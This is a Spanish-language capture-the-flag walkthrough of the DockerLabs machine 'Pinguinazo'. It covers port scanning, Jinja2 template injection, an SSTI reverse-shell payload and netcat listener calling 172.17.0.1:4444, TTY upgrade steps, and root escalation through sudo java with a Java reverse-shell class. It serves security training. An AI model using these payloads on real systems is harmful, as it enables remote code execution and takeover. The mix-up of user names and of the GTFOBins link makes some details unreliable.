---
title: Pinguinazo - DockerLabs
published: true
categories: DockerLabs
---


| OS     | Dificultad  | Creator           |
| ------ | ----------- | -------------     | 
| Linux  |  Fácil      | El Pingüino de Mario       | 


# Reconocimiento

Comenzamos el proceso de reconocimiento identificando los puertos abiertos en el sistema objetivo. 
```shell
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG ports 
```
-  `-p-`: Escanea todos los puertos (1-65535).
- `--open`: Solo muestra los puertos abiertos.
- `-sS`: Realiza un escaneo SYN, que es rápido y discreto.
- `--min-rate=5000`: Envía al menos 5000 paquetes por segundo, acelerando el escaneo.
- `-n`: No realiza resolución DNS.
- `-Pn`: No realiza ping previo para determinar si el host está activo.
- `-vvv`: Muestra resultados detallados y en tiempo real.

![image](https://github.com/user-attachments/assets/a1b3010c-7235-45e3-a057-cf16acc3df66)

El escaneo detecta el puerto `5000`, que parece corresponder a un servicio HTTP.

A continuación, evaluamos si los puertos abiertos presentan alguna vulnerabilidad, además de obtener más información sobre los servicios asociados a esos puertos.

```bash
nmap -p5000 -sCV 172.17.0.2 -oG targeted
```

# Exploración Web
Al acceder al puerto `5000`, encontramos una página con un formulario de entrada que muestra el texto ingresado en un mensaje de respuesta:

![image](https://github.com/user-attachments/assets/9ad77e97-b5ea-46e9-a5f4-40278e2b5d1d)

Dependiendo de lo que pongamos en el apartado de nombre, nos lo pone en un mensaje. 

![image](https://github.com/user-attachments/assets/a0ef092c-6331-423c-b27f-19392b169c2a)

Probamos inyectar `{{7*7}}` para verificar si el formulario interpreta entradas como código:

![image](https://github.com/user-attachments/assets/39109651-e9ac-444b-9063-72f29577311a)

Al recibir `49` como resultado, confirmamos que el formulario permite Inyección de Plantillas del Lado del Servidor (SSTI), lo que indica que podríamos estar trabajando con Jinja2 en el backend. Nos basamos en [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection). para confirmar esto, y usamos el siguiente payload para ejecutar el comando `id`:
```bash
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```
# Reverse Shell

Para obtener una reverse shell, usamos el siguiente payload para ejecutar un comando de conexión inversa desde el servidor a nuestra máquina local:
```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c \'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1\'').read() }}
```
Simultáneamente, escuchamos con `netcat` en el puerto `4444` en nuestra máquina:
```bash
nc -lvnp 4444  
```

# Intrusión 

Después de ejecutar el payload, obtenemos acceso a la máquina como el usuario `pinguinazo`.

## TTY ReverseShell

### Iniciar una sesión de shell interactiva
En nuestra shell básica, ejecutamos el siguiente comando para forzar la creación de una sesión de bash interactiva:
```bash
script /dev/null -c bash
```
### Suspender la shell
Una vez que el comando anterior está en ejecución, utilizamos
```bash
Control+Z
```
para suspender temporalmente nuestra shell.

### Preparar nuestro terminal local:
Antes de volver a nuestra shell, configuramos nuestro terminal local:
```bash
stty raw -echo; fg
```

### Resetear la configuración del terminal
Ahora que tenemos el control de la shell, la reseteamos para asegurar que se comporta correctamente:
```bash
reset
```

### Configura el tipo de terminal:
```bash
xterm
export TERM=xterm
export SHELL=bash
```

# Escalada de Privilegios.

Al ejecutar `sudo -l`, notamos que spencer tiene permisos para ejecutar `java` como `root`.Utilizando [GTFOBins](https://gtfobins.github.io/gtfobins/awk/#shell) sabemos cómo explotar estos binarios.

![image](https://github.com/user-attachments/assets/5223fbe6-c1ec-4b5c-9ea9-9987abacb551)

Creamos un archivo en /tmp llamado shell.java con el siguiente código para ejecutar una reverse shell:

```bash
public class shell {
    public static void main(String[] args) {
        Process p;
        try {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/172.17.0.1/4444 0>&1");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}
```

Compilamos y ejecutamos el código con java:

```bash
sudo /usr/bin/java shell.java 
```
Con esto, obtenemos acceso como root.

![image](https://github.com/user-attachments/assets/64d1a323-c580-430e-8a7a-de4b4da2cb2c)
